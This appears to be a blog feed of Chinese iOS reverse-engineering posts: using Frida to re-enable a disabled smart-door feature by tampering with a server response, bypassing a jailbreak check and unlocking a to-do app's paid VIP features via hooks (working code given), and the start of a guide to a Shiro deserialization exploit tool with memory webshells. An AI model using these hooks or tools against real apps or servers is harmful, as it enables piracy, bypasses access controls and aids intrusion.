class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xx.xxlife -m <span class="string">"+[RSAUtil encryptString:publicKey:]"</span></span><br></pre></td></tr></table></figure><p><img src="10.png" alt="追踪RSA加密"></p><p>由上面的hook可以看到加密的参数格式以及RSA的public key，接下来进行验证一下。</p><p>这里有一个问题，当使用该public key进行加密时，当加密的数据长度大于117时，会报错。</p><p><img src="11.png" alt="RSA加密出错"></p><p>解决的方法是对加密的数据根据长度117进行分割，使用rsa加密后拼接，最后返回拼接后的数据。</p><p><img src="12.png" alt="解决RSA加密出错"></p><p>修改后可以成功登录，接下来是一键开门的操作。</p><p>当使用一键开门的功能时提示<code>该小区未开启一键开门功能</code></p><img src="13.png" alt="APP一键开门" style="zoom:50%;" /><blockquote><p>之前是可以使用该功能的，可能由于有业主频繁的开门，物业怕影响正常的使用，后来该功能就不可用了。</p></blockquote><p>根据关键字定位到<code>sub_1000B5978</code>函数</p><p><img src="14.png" alt="sub_1000B5978函数"></p><p>发现是否开启一键开门功能是根据<code>isClickOpen</code>来判断的，当该值不为2时可以使用该功能。在操作APP的时候可以发现返回值中有<code>isClickOpen</code>，通过拦截数据包修改该值为非2的值，如修改为1。</p><p><img src="15.png" alt="修改isClickOpen"></p><p>再次使用一键开门功能可以正常使用。该功能发送的请求：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">POST /xxxxApi/userCommunity/IsOpenDoor HTTP/<span class="number">1.1</span></span><br><span class="line">Host: xxxxapp.xxxxxxx.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Connection: close</span><br><span class="line">Accept: *<span class="comment">/*</span></span><br><span class="line"><span class="comment">User-Agent: PerfectLife/3.01.0 (iPhone; iOS 12.4.1; Scale/2.00)</span></span><br><span class="line"><span class="comment">Accept-Language: zh-Hans-CN;q=1</span></span><br><span class="line"><span class="comment">Content-Length: 545</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">accessToken=84379_2eb78c1f6249447a9922039f35fc1fd7&amp;applicationType=2&amp;deviceType=2&amp;houseId=xxxxx&amp;sign=ZkZMPY2OHqCWlW4s%2BXfKFs3pmMfMbO95nGZVex/j7ci2jIakkS8J8wAnq%2BcjRygDI/vsuxPgz/SNRHRXlkzoGcqyglE483PDMbVzYBdtnLtrWFmEl/APAepcgT/Vsap7kr5vhjyf73HsAMFRwd0jKLnhX/Qy04l3FIMlvEs9mW1t7FGEkfRTuCpqz8cz%2B8Db4u8h8HOvyYS1SQiKNene0gdGztNxkFGayf1hPjPOWbSCpdQ9NbkPJ/4vSrGO%2B5HfB8umHvFYeamtByHdwiQsnfzMKcFuw4fGfG6nU35xBOsS1hY%2BWyeMh6/%2BPkXW%2BcyqWjT%2BssTp5F7IZhVibF/zcA%3D%3D&amp;terminalCode=865xxxx&amp;timestamp=1611820323000&amp;version=3.01.0&amp;versionCode=3010</span></span><br></pre></td></tr></table></figure><p>其中参数<code>houseId</code>是户主的房屋id，是固定值，与登录的用户有关。可以通过接口<code>appUserHouse/getHouseAndFocusList</code>获取。</p><p>参数<code>terminalCode</code>是小区门的编码，该值可能会变化，可以通过接口<code>door/list</code>获取。</p><p>返回的内容</p><p><img src="16.png" alt="一键开门返回包内容"></p><p>然后就可以利用代码实现一键开门的操作</p><p><img src="17.png" alt="使用代码一键开门"></p><blockquote><p>为了不影响正常使用，这里仅获取houseId与terminalCode，不进行开门操作。</p></blockquote><p>接下来就是快捷指令的编写，实现一键控制。</p><h3 id="0x03-快捷指令编写"><a href="#0x03-快捷指令编写" class="headerlink" title="0x03 快捷指令编写"></a>0x03 快捷指令编写</h3><p>如果结合其他APP或者借助其他平台的话很容易就可以编写快捷指令，如可以使用<code>Pythonista</code>(需付费下载)，复制上面的python脚本，直接通过快捷指令调用，也可以通过快捷指令登录SSH运行脚本(需要有服务器)。</p><img src="18.png" alt="快捷指令运行SSH脚本" style="zoom:50%;" /><p>但对于普通用户来说这种操作不易实现（需要一定的成本），这里采取了一种稍微繁琐的方法，但都尽量采用快捷指令来实现（或者借助免费的应用来实现）。</p><p>以登录过程为例，进行快捷指令的编写。</p><p>登录过程所需的参数：</p><p><img src="canshu.png" alt="参数"></p><table><thead><tr><th align="center">参数名称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">accessToken</td><td align="center">登录时为空</td></tr><tr><td align="center">applicationType</td><td align="center">当前环境下固定值2</td></tr><tr><td align="center">deviceType</td><td align="center">当前环境下固定值2</td></tr><tr><td align="center">password</td><td align="center">密码</td></tr><tr><td align="center">phone</td><td align="center">手机号</td></tr><tr><td align="center">sign</td><td align="center">对其他参数进行RSA加密获取</td></tr><tr><td align="center">timestamp</td><td align="center">当前时间的时间戳</td></tr><tr><td align="center">version</td><td align="center">当前版本3.01.0</td></tr><tr><td align="center">versionCode</td><td align="center">当前版本3010</td></tr></tbody></table><p>其中时间戳和RSA加密的sign值需要去获取，获取时间戳可以通过快捷指令来实现。</p><img src="19.png" alt="获取时间戳快捷指令" style="zoom:50%;" /><p>RSA加密的话，本来可以借助在线平台来实现，但是由于使用该APP的Public key进行加密时，待加密字符串长度大于117时会报错。</p><p><img src="20.png" alt="在线RSA加密出错"></p><p>使用截取字符串的话快捷指令没有截取文本，只有一个根据条件拆分字符，所以这里打算借助其他APP通过执行JavaScript脚本来实现。这里采用的APP是JSBOX，虽然该APP有很多功能，但是都需要高级版才可以使用。不过免费版可以通过快捷指令来执行JavaScript脚本。</p><p>JS实现RSA加密可以使用<a href="http://travistidwell.com/jsencrypt/" target="_blank" rel="noopener">jsencrypt</a> ，主要代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**省略jsencrypt代码**/</span></span><br><span class="line"><span class="keyword">var</span> PUBLIC_KEY = <span class="string">'MIGfMA0GCSqGSI......7nNQIDAQAB'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">encrypt.setPublicKey(<span class="string">'-----BEGIN PUBLIC KEY-----'</span> + PUBLIC_KEY + <span class="string">'-----END PUBLIC KEY-----'</span>);</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">'待加密字符串'</span>;</span><br><span class="line"><span class="keyword">var</span> divide =  <span class="built_in">parseInt</span>(str.length / <span class="number">117</span>);</span><br><span class="line"><span class="keyword">if</span> (divide &gt; <span class="number">0</span>)&#123;divide=divide;&#125; <span class="keyword">else</span> divide=divide + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> line = divide ;</span><br><span class="line"><span class="keyword">if</span>(str.length % <span class="number">117</span> != <span class="number">0</span>)&#123;</span><br><span class="line">    line = divide + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> encrypted = <span class="string">''</span> ;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i&lt;line ;i++)&#123;</span><br><span class="line">    encrypted += b64tohex(encrypt.encrypt(str.substring(i*<span class="number">117</span>,(i+<span class="number">1</span>)*<span class="number">117</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> result = hex2b64(encrypted);</span><br><span class="line"></span><br><span class="line">result;</span><br></pre></td></tr></table></figure><p>RSA加密的快捷指令</p><p><img src="21.png" alt="RSA加密快捷指令"></p><p>这样借助JSBOX运行JavaScript来实现RSA加密就完成了，剩下的就好做了。</p><p>一个快捷指令可以看作是程序里的一个函数，可以在其他快捷指令中来调用。使用快捷指令的的登录过程如下：</p><p><img src="22.png" alt="登录快捷指令"></p><p>登录成功返回accessToken，然后在其他操作中需要使用该token。其他的操作都类似，先在快捷指令中调用登录，然后请求相关的api即可。如开门的快捷指令如下：</p><img src="23.png" alt="开门快捷指令" style="zoom:50%;" /><p>使用的话可以直接点击<code>开东门</code>的快捷指令，或者使用语音<code>嘿Siri，开东⻔</code>来开启小区入口门。开启其他大门类似，修改对应的terminalCode即可。</p><p>给别人使用的话也很简单，通过快捷指令<a href="https://www.icloud.com/shortcuts/b7cf16f2de72470ab165f80c23efeb5a" target="_blank" rel="noopener"><code>Backup Shortcuts To iCloud</code></a>将所需的快捷指令共享给别人，然后下载JSBOX即可使用。</p><h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文通过快捷指令实现了一个”智能开门”指令，快捷指令实现起来比较简单，但是功能有限制，有些功能需要借助一下其他的APP或者平台才能实现，本文为了大众化才采用了比较繁琐的方法来实现，如果是自己使用的话当然是怎么方便怎么来。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h3&gt;&lt;p&gt;前段时间朋友小区换了一个智能门禁系统，户主通过一个APP进行管理，可以远程进行开锁操作。刚好这段时间在使用IOS的快捷指令操作，于是想做一个一键开门的快捷指令，直接通过快捷指令来完成开门的操作。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IOS逆向" scheme="https://fuping.site/categories/IOS%E9%80%86%E5%90%91/"/>
    
    
      <category term="IOS逆向" scheme="https://fuping.site/tags/IOS%E9%80%86%E5%90%91/"/>
    
      <category term="快捷指令" scheme="https://fuping.site/tags/%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>IOS逆向初探</title>
    <link href="https://fuping.site/2020/12/16/IOS-APP-tomatodo-Cracked/"/>
    <id>https://fuping.site/2020/12/16/IOS-APP-tomatodo-Cracked/</id>
    <published>2020-12-16T07:02:10.000Z</published>
    <updated>2020-12-25T01:35:32.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>本文记录了某次逆向一个简单APP的过程，来简单介绍一下IOS逆向的流程，比较基础，属于入门级教程。包括砸壳、HOOK、插件的编写等一系列流程。</p><a id="more"></a><h2 id="0x01-背景"><a href="#0x01-背景" class="headerlink" title="0x01 背景"></a>0x01 背景</h2><p>前段时间在一个老师那里看到一群考研人的打卡信息，该APP能够详细的记录和分析学习过程。</p><img src="01.png" alt="考研人打卡信息" style="zoom:50%;" /><p>于是就下载试用了一下。但是免费版有许多的限制。如免费版的话仅可以添加2个”习惯”类代办，</p><img src="02.png" alt="添加代办" style="zoom:33%;" /><p>使用背景图也是需要开通季度卡的（虽然并没什么用）。</p><img src="03.png" alt="背景" style="zoom:33%;" /><p>手机上打开”季度卡”页面，由于手机经过了越狱，在开通的时候提示<code>非常抱歉，由于Apple的安全策略，暂不支持越狱用户购买，可点击右上角获取帮助-其他问题联系我们解决</code>。</p><img src="04.png" alt="越狱禁止购买" style="zoom:33%;" /><p>虽然免费版不影响正常使用，但是本着学习的态度想查看一下其越狱检测的绕过，结果发现竟然可以白嫖使用<code>VIP</code>功能。</p><h2 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h2><p>IOS下逆向常规操作判断该APP是否加壳(加密)，有壳的话先进行砸壳，然后利用IDA或者Hopper对脱壳后的Mach-O文件进行分析。首先需要准备一下环境和工具。</p><h3 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h3><p>手机设备：一台越狱的IOS手机，版本为12.4.1，安装了OpenSSH和Frida，Frida版本为14.1.3。</p><p>逆向分析工具：IDA或者Hopper。</p><p>开发工具：Xcode。</p><p><del>抓包工具：BurpSuite 或者Charles。</del></p><p>电脑上安装Frida版本为14.1.3。</p><p>由于是APPStore下载的APP，是经过了加壳的。接下来开始对该APP进行砸壳。</p><h3 id="2-砸壳"><a href="#2-砸壳" class="headerlink" title="2. 砸壳"></a>2. 砸壳</h3><p>砸壳的脚本有很多，如<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">frida-ios-dump</a>、<a href="https://github.com/stefanesser/dumpdecrypted" target="_blank" rel="noopener">dumpdecrypted</a>、<a href="https://github.com/KJCracks/Clutch" target="_blank" rel="noopener">Clutch</a>、<a href="https://github.com/DerekSelander/yacd" target="_blank" rel="noopener">yacd</a>等，这里采用的工具是<a href="https://github.com/AloneMonkey/frida-ios-dump" target="_blank" rel="noopener">frida-ios-dump</a>。</p><p>安装方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/AloneMonkey/frida-ios-dump</span><br><span class="line"><span class="built_in">cd</span> frida-ios-dump</span><br><span class="line">pip install -r requirements.txt --upgrade</span><br></pre></td></tr></table></figure><p>安装完成所需的依赖后打开dump.py进行配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User = <span class="string">'root'</span></span><br><span class="line">Password = <span class="string">'alpine'</span><span class="comment">#默认的密码</span></span><br><span class="line">Host = <span class="string">'localhost'</span></span><br><span class="line">Port = <span class="number">2222</span> <span class="comment">#根据自己的端口进行修改</span></span><br><span class="line">KeyFileName = <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>使用方法:</p><p><code>python3 dump.py APP名字</code> 或者<code>python3 dump.py Bundle identifier</code></p><p>将手机与电脑连接，打开APP，执行<code>frida-ps -Ua</code>,查看APP名字和Identifier。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frida-ps -Ua</span><br><span class="line"> PID  Name    Identifier</span><br><span class="line">----  ------  --------------------</span><br><span class="line">7312  APP名字  com.xxxx.tomatodo</span><br></pre></td></tr></table></figure><p>然后进行砸壳</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iproxy 2222 22</span><br><span class="line">python3 dump.py com.xxxx.tomatodo</span><br></pre></td></tr></table></figure><blockquote><p>也可以执行<code>python3 dump.py APP名字</code>进行砸壳</p></blockquote><p><img src="05.png" alt="砸壳"></p><p>砸了壳后提取出<code>TomatoTime</code>可执行文件，扔到<code>IDA</code>或者<code>Hopper</code>里面分析。</p><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>根据关键文字进行搜索，这里搜索的是”越狱”。由于Mac上的IDA7.0搜不出来中文字符，所以可以使用Hopper搜索，找到函数位置后使用IDA打开。也可以全程使用Hopper进行分析。</p><p>使用hopper搜索”越狱”字符串</p><p><img src="06.png" alt="搜索字符串"></p><p>发现是在方法<code>startPay:</code>中</p><p><img src="07.png" alt="找到方法startPay:"></p><p>找到后可以继续使用Hopper进行分析，或者在IDA中分析，我在这里采用了IDA。</p><p>直接在函数中搜索<code>-[SeasonCardController startPay:]</code>。</p><p><img src="08.png" alt="IDA搜索方法"></p><p>发现是该APP判断是否越狱，是根据是否存在Cydia来进行判断的。当<code>/Applications/Cydia.app</code>文件存在时，则提示用户越狱。</p><p>绕过这种越狱检测的方法也很简单，直接进行Hook <code>fileExistsAtPath:</code>方法即可。当判断<code>/Applications/Cydia.app</code>文件存在时将返回值改为0，即可绕过这里的越狱判断。</p><h3 id="4-越狱绕过"><a href="#4-越狱绕过" class="headerlink" title="4.  越狱绕过"></a>4.  越狱绕过</h3><p>根据上面的分析，开始对<code>-[NSFileManager fileExistsAtPath:]</code>进行Hook。</p><p>代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jailbreakPaths = [<span class="string">"/Applications/Cydia.app"</span>];</span><br><span class="line"><span class="keyword">var</span> isJailBreakChecked = <span class="literal">false</span></span><br><span class="line">Interceptor.attach(ObjC.classes.NSFileManager[<span class="string">"- fileExistsAtPath:"</span>].implementation, &#123;</span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">    isJailBreakChecked = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">this</span>.path = <span class="keyword">new</span> ObjC.Object(args[<span class="number">2</span>]).toString(); <span class="comment">// check if the looked up path is in the list of common_paths</span></span><br><span class="line">    <span class="keyword">if</span> (jailbreakPaths.indexOf(<span class="keyword">this</span>.path) &gt; <span class="number">-1</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"fileExistsAtPath: check for -&gt;  "</span> + <span class="keyword">this</span>.path);</span><br><span class="line">      isJailBreakChecked = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isJailBreakChecked) &#123;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change before:"</span>+retval);</span><br><span class="line">    retval.replace(<span class="number">0</span>);<span class="comment">//当判断/Applications/Cydia.app文件存在时将返回值改为0</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change after:"</span> + retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>执行方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l tomatodo-jailbreak-bypass.js -f  com.xxxx.tomatodo --no-pause</span><br></pre></td></tr></table></figure><p><img src="09.png" alt="越狱绕过"></p><p>此时再次打开APP，可以成功进入季度卡开通界面。</p><img src="10.png" alt="越狱绕过结果" style="zoom:33%;" /><p>当然也可以使用objection进行绕过越狱检测。</p><p>使用方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objection -g &quot;com.xxxx.tomatodo&quot; explore --startup-command &quot;ios jailbreak disable&quot;</span><br></pre></td></tr></table></figure><p><img src="11.png" alt="objection越狱绕过"></p><p>也是可以成功绕过越狱检测的。</p><h3 id="5-Vip功能绕过"><a href="#5-Vip功能绕过" class="headerlink" title="5.Vip功能绕过"></a>5.Vip功能绕过</h3><p>在<code>-[SeasonCardController startPay:]</code>方法中有第53行这样一个判断，根据意思应该是判断是否激活。</p><p><img src="12.png" alt="isActive"></p><p>根据上面的代码，猜测<code>+[CommonUtil isActive]</code>的结果是判断是否开通了季度卡的依据。在这里使用<code>frida-trace</code>进行追踪，<code>frida-trace</code> 用于跟踪函数或者 Objective-C 方法的调用，-m 跟踪某个 Objective-C 方法。</p><p>使用方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida-trace -U -f com.xxxx.tomatodo -m <span class="string">"+[CommonUtil isActive]"</span></span><br></pre></td></tr></table></figure><p>它会在当前目录下生成一个 <code>__handlers__</code>目录，然后在目录下生成一个 <code>类名/方法名.js</code> 文件，这里的文件名为<code>/CommonUtil/isActive.js</code>。当在调用该方法时，会输出以下信息，按 Ctrl-C 可以停止跟踪。</p><p><img src="13.png" alt="frida-trace"></p><p>打开生成的js文件会看到有两个函数，onEnter 是进入该函数时会执行的代码，onLeave 是该函数执行完离开时会执行的代码。在这里直接修改返回值retval为1。其代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  onEnter(log, args, state) &#123;</span><br><span class="line">    log(<span class="string">`+[CommonUtil isActive]`</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  onLeave(log, retval, state) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change before:"</span>+retval);</span><br><span class="line">    retval.replace(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"change after:"</span>+retval);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次执行 frida-trace，<code>/CommonUtil/isActive.js</code> 文件不会覆盖，会执行刚才添加好的代码，如下：</p><p><img src="14.png" alt="fridaHook-isActive"></p><p>此时发现不仅可以使用季度卡背景</p><img src="15.png" alt="bg-freeUse" style="zoom:33%;" /><p>而且也可以可以添加多个习惯类代办</p><img src="16.png" alt="frida-isActivite" style="zoom:33%;" /><blockquote><p>其实并不是，在测试的时候由于没有注意，添加了两个<code>习惯</code>和一个<code>目标</code>，导致认为通过hook <code>+[CommonUtil isActive]</code>方法可以解锁全部的VIP功能，一直到后来写插件的时候才发现该错误，在编写非越狱插件时有详细的分析。</p></blockquote><p>所以通过hook方法 <code>+[CommonUtil isActive]</code>可以实现到<code>VIP功能</code>的使用。</p><p>但这些都是在越狱手机上使用的，如果想在非越狱手机上使用的话，就需要使用一些插件来运行在非越狱手机上。</p><h2 id="0x03-编写非越狱插件"><a href="#0x03-编写非越狱插件" class="headerlink" title="0x03 编写非越狱插件"></a>0x03 编写非越狱插件</h2><p>编写插件采用了非越狱插件开发集成神器<a href="https://github.com/AloneMonkey/MonkeyDev" target="_blank" rel="noopener">MonkeyDev</a>，集成了theos+Tweaks+Reveal.framework +Cycript +class-dump+CaptainHook。</p><p>安装和卸载可以参考<a href="https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85" target="_blank" rel="noopener">https://github.com/AloneMonkey/MonkeyDev/wiki/%E5%AE%89%E8%A3%85</a></p><p>安装完成后新建MonkeyApp</p><p><img src="17.png" alt="新建MonkeyApp"></p><p>输入项目名称</p><img src="18.png" alt="项目名称" style="zoom: 50%;" /><p>项目建立后将砸壳后的APP拖入到TargetApp目录下。</p><img src="19.png" alt="放入TargetApp目录下" style="zoom:50%;" /><p>这里使用Logos进行Hook代码，HOOK 某个类里面的某个对象方法语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">%hook 类名</span><br><span class="line">- (返回值)方法名:(id)arg1 ....</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>这里我们需要对CommonUtil 类的方法isActive进行HOOK，修改返回值，代码如图所示。</p><p><img src="20.png" alt="hook"></p><p>连接非越狱手机后使用<code>⌘+R</code>运行该项目，手机上会多出来一个名字一样的APP。理论上来讲该APP可以使用其<code>VIP</code>功能。</p><blockquote><p>首次在新设备上运行，需要设置-通用-描述文件与设备管理中信任证书。</p></blockquote><img src="21.png" alt="非越狱设备运行" style="zoom: 33%;" /><p>然而此时只能使用<code>VIP</code>的部分功能，可以使用会员背景，但是无法添加超过2个<code>习惯</code>和<code>目标</code>类代办。此时才发现在使用frida进行hook的时候，测试添加多个习惯类代办时添加了两个<code>习惯</code>，一个<code>目标</code>，因此给出了可以使用全部<code>VIP</code>功能的结论。</p><p>通过关键字定位到<code>-[AddTodoController confirm]</code>方法。</p><p><img src="22.png" alt="定位代办"></p><p>发现添加超过2个<code>习惯</code>和<code>目标</code>类代办需要判断GVUserDefaults的isActive是否为真。</p><p>而且查看<code>+[CommonUtil isActive]</code>方法，其返回结果也是获取的<code>GVUserDefaults</code>isActive属性的值。</p><p><img src="23.png" alt="CommonUtil isActive方法"></p><p>对<code>+[GVUserDefaults standardUserDefaults]</code>进行hook，修改其isActive属性。</p><p>代码如下：</p><figure class="highlight objc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">GVUserDefaults</span> : <span class="title">NSObject</span></span></span><br><span class="line"><span class="keyword">@property</span>(<span class="keyword">nonatomic</span>) _Bool isActive;</span><br><span class="line"><span class="keyword">@end</span></span><br><span class="line"></span><br><span class="line">%hook GVUserDefaults</span><br><span class="line"></span><br><span class="line">+ (<span class="keyword">id</span>)standardUserDefaults&#123;</span><br><span class="line">    GVUserDefaults *gvUser = %orig();</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@"GVUserDefaults isActive old----&gt;%d"</span>,[gvUser isActive]);</span><br><span class="line">    [gvUser setIsActive:<span class="literal">true</span>];</span><br><span class="line">    <span class="built_in">NSLog</span>(<span class="string">@"GVUserDefaults isActive new----&gt;%d"</span>,[gvUser isActive]);</span><br><span class="line">    <span class="keyword">return</span> gvUser;</span><br><span class="line">&#125;</span><br><span class="line">%end</span><br></pre></td></tr></table></figure><p>执行结果</p><img src="24.png" alt="hook standardUserDefaults" style="zoom:50%;" /><p>此时可以使用超过2个<code>习惯</code>和<code>目标</code>类以及使用全部的背景功能。</p><img src="25.png" alt="解锁全部VIP功能" style="zoom: 33%;" /><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本文通过一个简单的APP逆向，实现了越狱绕过以及解锁VIP会员功能。简单的介绍了一下相关工具的使用。关于越狱绕过，该APP越狱检测的方法很简单，只是判断了文件是否存在。其他检测的方式有：可以尝试读取系统所有的应用名称列表，看有无权限获取；检测stat是否出自系统库等。更多检测方式可以参考<a href="https://kingdomrain002.github.io/2019/01/14/iOS开发-安全相关-越狱检测/" target="_blank" rel="noopener">iOS开发-安全相关-越狱检测</a> 。</p><p>对于该APP使用体验来讲，免费版功能已经够用了，而且无广告，如果有需要的可以开通季度卡，解锁更多功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;本文记录了某次逆向一个简单APP的过程，来简单介绍一下IOS逆向的流程，比较基础，属于入门级教程。包括砸壳、HOOK、插件的编写等一系列流程。&lt;/p&gt;
    
    </summary>
    
    
      <category term="IOS逆向" scheme="https://fuping.site/categories/IOS%E9%80%86%E5%90%91/"/>
    
    
      <category term="IOS逆向" scheme="https://fuping.site/tags/IOS%E9%80%86%E5%90%91/"/>
    
      <category term="frida" scheme="https://fuping.site/tags/frida/"/>
    
  </entry>
  
  <entry>
    <title>ShiroExploit使用指南</title>
    <link href="https://fuping.site/2020/11/27/ShiroExploit-Readme/"/>
    <id>https://fuping.site/2020/11/27/ShiroExploit-Readme/</id>
    <published>2020-11-27T05:55:56.000Z</published>
    <updated>2020-11-27T06:20:20.461Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><p>一款关于Shiro 1.2.4反序列化漏洞利用的回显工具。最新版本为v2.4。</p><a id="more"></a><blockquote><p>v2.4与v2.3相差不大，使用v2.3即可。</p><p>v2.3下载地址：<a href="https://github.com/fupinglee/JavaTools/blob/master/Shiro/ShiroExploit-v2.3.jar" target="_blank" rel="noopener">https://github.com/fupinglee/JavaTools/blob/master/Shiro/ShiroExploit-v2.3.jar</a><br>v2.3使用说明：<a href="https://github.com/fupinglee/JavaTools/blob/master/Shiro/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E-v2.3.pdf" target="_blank" rel="noopener">https://github.com/fupinglee/JavaTools/blob/master/Shiro/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E-v2.3.pdf</a></p></blockquote><p><strong>支持：</strong></p><p> 1.支持Tomcat7、Tomcat8、Tomcat9下的回显。</p><p> 2.支持Tomcat7、Tomcat8、Tomcat9下内存cmd马的写入与卸载。</p><p> 执行成功访问的URL为<a 